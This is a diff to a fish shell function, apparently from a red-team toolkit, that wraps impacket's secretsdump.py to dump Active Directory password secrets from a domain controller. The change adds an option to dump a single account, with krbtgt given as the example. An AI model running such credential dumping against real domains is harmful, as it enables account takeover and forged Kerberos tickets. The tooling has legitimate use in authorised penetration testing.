@@ -5,7 +5,7 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
         set wizard 1
     end
 
-    argparse h/help q/quiet u/username= p/password= H/hash= d/domain= k/kerberos w/wizard -- $argv
+    argparse h/help q/quiet u/username= p/password= H/hash= d/domain= k/kerberos t/target-user= w/wizard -- $argv
     or return 1
 
     if set -q _flag_help
@@ -14,13 +14,14 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
         echo "Dump Active Directory secrets using impacket's secretsdump.py."
         echo ""
         echo "Options:"
-        echo "  -u, --username USER Auth username"
-        echo "  -p, --password PASS Auth password"
-        echo "  -H, --hash HASH     Auth NTLM hash"
-        echo "  -d, --domain DOMAIN Target domain FQDN"
-        echo "  -k, --kerberos      Use Kerberos authentication"
-        echo "  -q, --quiet         Skip prompts and use cached/default values"
-        echo "  -h, --help          Show this help message"
+        echo "  -t, --target-user USER  Just dump the specified user (e.g. krbtgt)"
+        echo "  -u, --username USER     Auth username"
+        echo "  -p, --password PASS     Auth password"
+        echo "  -H, --hash HASH         Auth NTLM hash"
+        echo "  -d, --domain DOMAIN     Target domain name"
+        echo "  -k, --kerberos          Use Kerberos authentication"
+        echo "  -q, --quiet             Skip prompts and use cached/default values"
+        echo "  -h, --help              Show this help message"
         return 0
     end
 
@@ -29,6 +30,7 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
     set -l auth_user $_flag_username
     set -l auth_pass $_flag_password
     set -l auth_hash $_flag_hash
+    set -l target_user $_flag_target_user
 
     # Load defaults
     if test -z "$target"
@@ -40,6 +42,9 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
     if test -z "$domain"
         set domain $__KRONOS_CACHE_SECRETS_DOMAIN
         if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
+    end
+    if test -z "$target_user"
+        set target_user $__KRONOS_CACHE_SECRETS_TARGET_USER
     end
     if test -z "$auth_user"
         set auth_user $__KRONOS_CACHE_SECRETS_AUTH_USER
@@ -66,6 +71,14 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
         set domain (__kronos_ask "Domain Name" "$domain"); or return 1
         set -U __KRONOS_CACHE_SECRETS_DOMAIN "$domain"
 
+        set -l dump_all (__kronos_ask_confirm "Dump ALL account secrets?" y); or return 1
+        if test "$dump_all" = "no"
+            set target_user (__kronos_ask "Specific user to dump (e.g. krbtgt)" "$target_user"); or return 1
+            set -U __KRONOS_CACHE_SECRETS_TARGET_USER "$target_user"
+        else
+            set target_user ""
+        end
+
         if not set -q _flag_kerberos
             set auth_user (__kronos_ask "Auth Username" "$auth_user"); or return 1
             set -U __KRONOS_CACHE_SECRETS_AUTH_USER "$auth_user"
@@ -87,9 +100,10 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
         echo "Configuration:"
         echo "  Target: $target"
         echo "  Domain: $domain"
+        echo "  Dumping: "(test -n "$target_user"; and echo "User: $target_user"; or echo "All Users")
         echo "  Auth:   "(set -q _flag_kerberos; and echo "Kerberos"; or echo "$auth_user")
         echo ""
-        if test (__kronos_ask_confirm "Dump secrets from $target?" n) != "yes"
+        if test (__kronos_ask_confirm "Proceed with SecretsDump on $target?" n) != "yes"
             echo "Aborted."
             return 1
         end
@@ -106,6 +120,10 @@ function __kronos_secretsdump --description "Dump AD secrets using secretsdump.p
     set -l dump_args
     if test -n "$TGT_DC_IP"; set -a dump_args -dc-ip "$TGT_DC_IP"
     else if test -n "$TGT_DC"; set -a dump_args -dc-ip "$TGT_DC"; end
+
+    if test -n "$target_user"
+        set -a dump_args -just-dc-user "$target_user"
+    end
 
     if set -q _flag_kerberos
         set -a dump_args -k -no-pass "$domain/$auth_user@$target"
